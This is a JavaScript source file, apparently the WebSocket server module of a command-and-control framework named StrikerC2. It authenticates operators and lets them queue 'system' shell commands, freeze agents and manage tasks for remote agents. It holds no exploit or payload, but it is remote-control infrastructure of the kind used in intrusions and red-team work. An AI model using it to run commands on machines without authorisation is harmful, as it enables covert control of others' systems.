/**
 * @file The server side Web Sockets (WS) implementation.
 * @author Umar Abdul
 */

import {Server} from 'socket.io';
import User, * as userModel from '../models/user.js';
import Agent, * as agentModel from '../models/agent.js';
import Task, * as taskModel from '../models/task.js';
import {output} from './utils.js';

/**
 * Configure the web socket server and create event listeners.
 * @param {object} httpServer - The HTTP server object returned by Express.
 */
export const setupWS = (httpServer) => {

  // Create the socket server and make it global (we will be needing it in other files).
  global.socketServer = new Server(httpServer, {
    cors: {
      origin: global.ORIGIN_URL,
      methods: ["GET", "POST"]
    }
  });

  global.socketObjects = {}; // Maps usernames to connected socket objects.
  global.serverPrompt = "[StrikerC2] > "; // The console prompt to use for server output.
  const users = {}; // Maps connected socket IDs to usernames.

  // Define an auth middleware.
  socketServer.use((socket, next) => {

    const token = socket.handshake.auth.token;
    if (!token)
      return next(new Error("Access denied!"));
    // Authenticate.
    userModel.getUserByToken(token).then(user => {
      users[socket.id] = user.username;
      next();
    }).catch(error => {
      return next(new Error("Access denied!"));
    });
  });

  // Handle connections.

  socketServer.on('connection', (client) => {

    const serverPrompt = global.serverPrompt;
    const username = users[client.id];
    socketObjects[username] = client;
    output(`New ws connection for ${username}: ${client.id}`);

    /**
     * For processing raw console inputs from users. 
     * Note that some inputs are handled completely in the client side.
     * Both input and results are broadcasted to all connected users.
     */
    client.on("agent_console_input", (data) => {

      try{
        const agent = data.agent;
        const agentID = agent.uid.toString();
        const input = data.input.toString().trim();
        socketServer.emit("agent_console_output", {
          agentID,
          msg: `${username} > ${input}`
        });
        if (input.startsWith("system ")){ // For creating shell
          let cmd = input.substr(7).trim();
          const taskData = {
            agentID,
            taskType: "system",
            data: {
              cmd
            }
          };
          taskModel.createTask(username, taskData).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input === "freeze"){ // Freeze an agent.
          agentModel.freezeAgent(agentID).then(data => {
            if (data !== null){
              socketServer.emit("agent_console_output", {
                agentID,
                msg: serverPrompt + "Agent frozen by user: " + username
              });
            }
          }).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else if (input === "unfreeze"){ // Unfreeze an agent.
          agentModel.unfreezeAgent(agentID).then(data => {
            if (data !== null){
              socketServer.emit("agent_console_output", {
                agentID,
                msg: serverPrompt + "Agent unfrozen by user: " + username
              });
            }
          }).catch(error => {
            client.emit("striker_error", error.message);
          });
        }else{ // Unknown query
          socketServer.emit("agent_console_output", {
            agentID,
            msg: serverPrompt + "Unknown command " + input
          });
        }
      }catch(error){
        console.log(error);
        socketServer.emit("striker_error", error.message);
      }
    });

    // For queuing a prepared task for an agent.
    client.on("create_task", (data) => {

       taskModel.createTask(username, data).catch(error => {
        client.emit("striker_error", error.message);
      });
    });

    // For deleting a task.
    client.on("delete_task", (data) => {

      taskModel.deleteTask(data.agentID, data.taskID, username).catch(error => {
        client.emit("striker_error", error.message);
      });
    });

  });

};
